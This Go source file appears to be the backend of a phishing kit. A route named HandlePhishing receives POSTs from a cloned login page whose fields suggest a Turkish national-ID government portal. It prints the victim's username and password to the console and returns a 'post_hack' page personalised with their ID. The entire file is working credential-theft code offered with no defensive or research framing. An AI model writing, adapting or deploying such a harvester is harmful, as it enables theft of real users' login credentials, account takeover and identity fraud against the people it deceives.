package main

import (
	"fmt"
	"log"
	"mime"
	"net/http"
	"strconv"
	"strings"
	"webserver/app/cmd/util"
)

func main() {
	router()
}

func router() {
	log.Println("Setting routes")

	http.HandleFunc("/", Serve)
	log.Println("server is started from :" + strconv.Itoa(util.Config.Port()))
	log.Fatal(http.ListenAndServe(util.Config.Ip()+":"+strconv.Itoa(util.Config.Port()), nil))
}

func Serve(w http.ResponseWriter, r *http.Request) {
	log.Println("request index:", r.URL)
	if data, username := HandlePhishing(w, r); len(username) > 0 {
		contentHeader := mime.TypeByExtension("public/post_hack.html")
		if contentHeader != "" {
			w.Header().Add("Content-Type", contentHeader)
		}
		data = []byte(strings.ReplaceAll(string(data), "###NAME###", username))
		data = []byte(strings.ReplaceAll(string(data), "###TCKN###", username))
		w.WriteHeader(200)
		w.Write(data)
		return
	}

	data, err := util.ReadByteFrom("public/index.html")
	if err != nil {
		log.Println("           404: not found")
		w.WriteHeader(404)
		return
	}
	// Get mime type value and insert it into content header if it exists
	contentHeader := mime.TypeByExtension(util.Ext(r.URL.Path))
	if contentHeader != "" {
		w.Header().Add("Content-Type", contentHeader)
	}
	log.Println("respond    200:", contentHeader)
	w.WriteHeader(200)
	w.Write(data)
}

func HandlePhishing(w http.ResponseWriter, r *http.Request) ([]byte, string) {
	if r.Method != "POST" {
		return nil, ""
	}
	log.Println("Phishing started")
	// Parse the form data in the request
	err := r.ParseForm()
	if err != nil {
		http.Error(w, "Error parsing form data", http.StatusBadRequest)
		return nil, ""
	}
	// Print the form data to the console
	fmt.Println("Form data:")
	for key, value := range r.Form {
		fmt.Println(key, ":", value)
	}
	username := r.Form.Get("encTridField")
	password := r.Form.Get("encEgpField")

	fmt.Println("Collected username and password")
	fmt.Println("username: ", username)
	fmt.Println("password:", password)

	data, err := util.ReadByteFrom("public/post_hack.html")
	return data, username
}
